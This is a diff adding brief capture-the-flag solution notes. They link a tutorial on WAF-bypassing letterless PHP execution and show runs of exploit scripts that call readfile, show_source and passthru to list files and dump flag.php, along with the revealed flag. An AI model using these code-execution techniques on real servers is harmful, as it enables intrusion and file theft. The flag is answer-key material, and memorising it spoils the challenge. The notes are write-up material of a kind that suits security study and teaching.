@@ -1,0 +1,28 @@
+https://ironhackers.es/en/tutoriales/saltandose-waf-ejecucion-de-codigo-php-sin-letras/
+
+
+python3 exp.py phpinfo
+	PHP Version 7.4.16
+	...
+
+
+=========== Solution 1: readfile ===========
+python3 exp2.py readfile flag.php
+	<?php
+    $flag = "S4CTF{veRy_v3ry_very_e4sy_php}";
+
+=========== Solution 2: show_source ===========
+python3 exp2.py show_source flag.php
+	<code><span style="color: #000000">
+	<span style="color: #0000BB">&lt;?php<br />&nbsp;&nbsp;&nbsp;&nbsp;$flag&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">"S4CTF{veRy_v3ry_very_e4sy_php}"</span><span style="color: #007700">;<br /></span>
+	</span>
+	</code>
+
+=========== Solution 3: RCE ===========
+python3 exp2.py passthru ls
+	flag.php
+	index.php
+
+python3 exp2.py passthru "cat flag.php"
+	<?php
+    $flag = "S4CTF{veRy_v3ry_very_e4sy_php}";
